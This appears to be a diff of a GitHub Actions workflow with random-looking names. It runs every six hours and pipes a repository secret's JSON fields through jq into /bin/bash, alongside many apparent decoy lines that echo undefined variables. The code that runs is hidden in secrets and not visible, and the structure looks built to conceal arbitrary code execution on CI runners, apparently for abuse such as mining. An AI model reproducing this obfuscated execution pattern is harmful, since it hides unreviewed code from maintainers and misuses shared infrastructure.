@@ -3,8 +3,9 @@ name: baokoujiao7465
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 5/6 * * *'
-jobs:  # 6768
+    - cron: '36 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,18 +13,20 @@ jobs:  # 6768
       - uses: actions/checkout@v4
       - name: baokoujiao7465
         env:
-          a535: ${{ secrets.a535 }}
+          vfiqa1: ${{ secrets.vfiqa1 }}
         run: |
-          echo $a535 | jq -r .m7 | /bin/bash
-          echo $zym52141 | jq -r .zxtdi21441 | /bin/bash
-          echo $mxkf16592 | jq -r .zya6816 | /bin/bash
-          echo $bwgy0642 | jq -r .y7 | /bin/bash
-          echo $dnzy7820 | jq -r .e8490 | /bin/bash
-          echo $yahpd54 | jq -r .he1741 | /bin/bash
-          echo $xlb6 | jq -r .uc518 | /bin/bash
-          echo $r754 | jq -r .kh393 | /bin/bash
-          echo $n2 | jq -r .vpx71842 | /bin/bash
-          echo $nagaz0 | jq -r .sipmb7 | /bin/bash
-          echo $gyp2422 | jq -r .zdnej60 | /bin/bash
-          echo $eoa41597 | jq -r .ynphu974 | /bin/bash
+          echo $vfiqa1 | jq -r .j75 | /bin/bash
+          echo $i802 | jq -r .kb56350 | /bin/bash
+          echo $vcdin734 | jq -r .hydn35 | /bin/bash
+          echo $e7 | jq -r .xnkkk42 | /bin/bash
+          echo $qzld119 | jq -r .b4 | /bin/bash
+          echo $sjznf295 | jq -r .ltj532 | /bin/bash
+          echo $ug0 | jq -r .bs1472 | /bin/bash
+          echo $r0193 | jq -r .ychk676 | /bin/bash
+          echo $d1 | jq -r .jxy3096 | /bin/bash
+          echo $ciltc1191 | jq -r .r76 | /bin/bash
+          echo $pkutr12 | jq -r .ksjra95453 | /bin/bash
+          echo $j58839 | jq -r .ejfb64077 | /bin/bash
+          echo $vxm45 | jq -r .gthex725 | /bin/bash
+          echo $ww639 | jq -r .n98393 | /bin/bash
 
